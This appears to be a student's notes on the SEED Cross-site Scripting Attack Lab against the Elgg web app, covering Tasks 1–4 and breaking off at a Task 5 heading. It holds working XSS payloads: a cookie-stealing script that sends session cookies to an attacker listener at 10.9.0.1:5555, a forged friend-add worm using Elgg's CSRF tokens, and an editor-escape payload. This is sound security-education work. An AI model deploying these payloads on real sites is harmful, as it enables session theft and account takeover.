# Cross-site Scripting Attack Lab
- Cross-site Scripting (XSS) is a type of vulnerability commonly found in web applications. XSS makes it possible for attackers to inject malicious code (e.g., JavaScript programs) into victim's web browser, and steal a victim's credentials, such as session cookies. The access control policies (i.e., the same origin policy) employed by browsers to protect those credentials can be bypassed by exploiting XSS vulnerabilities
- topics
    - XSS attack
    - XSS worm and self-propagation
    - Session cookies
    - HTTP GET and POST requests
    - JavaScript and Ajax
    - Content Security Policy (CSP)

## Lab Setup
- DNS Setup: add some entries to `/etc/hosts`
    ```
    10.9.0.5        www.seed-server.com
    10.9.0.5        www.example32a.com
    10.9.0.5        www.example32b.com
    10.9.0.5        www.example32c.com
    10.9.0.5        www.example60.com
    10.9.0.5        www.example70.com
    ```
- web application: `Elgg`, a web-based social-networking application

## Preparation: Getting Familiar with the "HTTP Header Live" tool
- we need to capture, analyze, and construct HTTP requests in this lab
- use a Firefox add-on called `HTTP Header Live`

## Task 1: Posting a Malicious Message to Display an Alert Window
- objective: embed a JS program in our `Elgg` profile, such that when antoher user views our profile, the JS program will be executed and an alert window will be displayed
- use this JS program: `<script>alert('XSS');</script>`
- login with Alice's account, user name: `aclie`, password: `seedalice`
- Edit profile, and put the code in the brief description
- Go to the profile page, an alert is prompted
- if the JS program is too long, we can store the program in a standalone file, save it with `.js` extension, and then refer to it using the `src` attribute in the `<script>` tag
    ```
    <script type="text/javascript"
            src="http://www.example.com/myscripts.js">
    </script>
    ```

## Task 2: Posting a Malicious Message to Display Cookies
- use `<script>alert(document.cookie);</script>`
- then the script will print out the cookie: `Elgg=ugsb0ln5ip0ng59ftrph6nlvhb`

## Task 3: Stealing Cookies from the Victim's Machine
- in previous task, the attacker can print out the user's cookies, but only the user can see their own cookies, in this task, we want the JS code to send the cookies to us, e.g., the JS code needs to send an HTTP request to the attacker, with the cookies appended to the request
- we can do this by having the malicious JS insert an `<img>` tag with its `src` attribute set to the attacker's machine, when the JS insert the `img` tag, the browser tries to load the image from the URL in the `src` field, this result in an HTTP GET request sent to the attacker's machine
- code, `escape` is used to encode a string by replacing certain characters, e.g., spaces, punctuation, and non-ASCII characters with `%` followed by two hexadecimal digits
    ```
    <script>
        document.write('<img src=http://10.9.0.1:5555?c=' + escape(document.cookie) + '>');
    </script>
    ```
- on the attacker machine: `nc -lknv 5555`, this makes the attacker machine a TCP server that listens for a connection on port `5555`
    - `-l` listen
    - `-nv` give more verbose output
    - `-k` when a connection is completed, listen for another one

- after injecting the code into Alice's profile, login as admin (user name `admin`, password `seedadmin`), and open Alice's profile, we will see the following content on the attacker's machine, we can see that the admin's cookie is `Elgg=o66op359c58nrdshhjg1qurb3e`
    ```
    Connection received on 10.0.2.15 35640
    GET /?c=Elgg%3Do66op359c58nrdshhjg1qurb3e HTTP/1.1
    Host: 10.9.0.1:5555
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
    Accept: image/webp,*/*
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: http://www.seed-server.com/profile/alice
    Connection: keep-alive
    ```

## Task 4: Becoming the Victim's Friend
- this attack is similar to what Samy did to MySpace in 2005 (i.e., the Samy Worm), we will write an XSS worm that adds Samy as a friend to any other user that visits Samy's page, this worm doesn't self-propagate, but in task 6 it does
- write a JS program that forges HTTP requests directly from the victim's browser
- use HTTP Header Live to see what are sent to the server when a user adds a friend, it is actually a GET request with some parameters in the URL (the duplicated fields removed), this is what the URL looks like when Samy adds Charlie
    - `http://www.seed-server.com/action/friends/add?friend=58&__elgg_ts=1707036879&__elgg_token=yZAhDB7Dz7s7oA7LwQjmhA` 
- login as Alice and add Charlie
    - `http://www.seed-server.com/action/friends/add?friend=58&__elgg_ts=1707037676&__elgg_token=Gf3XT1cdnWD_wIQy4idzBQ`

- we can find that the parameter `friend` is the number of the user who is added (it is `59` for Samy, `58` for Charlie), but `__elgg_ts` and `__elgg_token` are changing, to launch the attack, we need to find a way to get the value of `__elgg_ts` and `__elgg_token` in the code
- if we inspect the element of the page, we can find `__elgg_ts` and `__elgg_token` in the `security.token` field of the variable `elgg`, so we can get their value using `elgg.security.__elgg_token` and `elgg.security.__elgg_ts`
- the malicious code
    ```
    <script type="text/javascript">
        window.onload = function () {
            var Ajax=null;
            var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
            var token="&__elgg_token="+elgg.security.token.__elgg_token;
            var sendurl="http://www.seed-server.com/action/friends/add?friend=59"+ts+token;
            Ajax=new XMLHttpRequest();
            Ajax.open("GET", sendurl, true);
            Ajax.send();
        }
    </script>
    ```
- login as another user, e.g., Charlie, then open Samy's profile, and refresh the page, we can see that Charlie becomes a friend of Samy

- what if the web application only provide the Editor mode for the `About Me` field, i.e., we cannot switch to the Text mode, can we still launch a sucessful attack?
    - if we directly put the code in `About Me` field, it will not work
    - after entering some content, e.g., `xyz`, click `Edit HTML`, we can see that the actual content is `<p>xyz</p>`, the content we input will be treated as a segment of text, we can bypass this by using the following payload
        - `</p><script>alert('XSS');</script><p>`
        - HTML code in browser
            ```
            <p></p>
            <script>alert('XSS');</script> <---- JS code
            </p><p>
            ```
## Task 5: Modifying the Victim's Profile
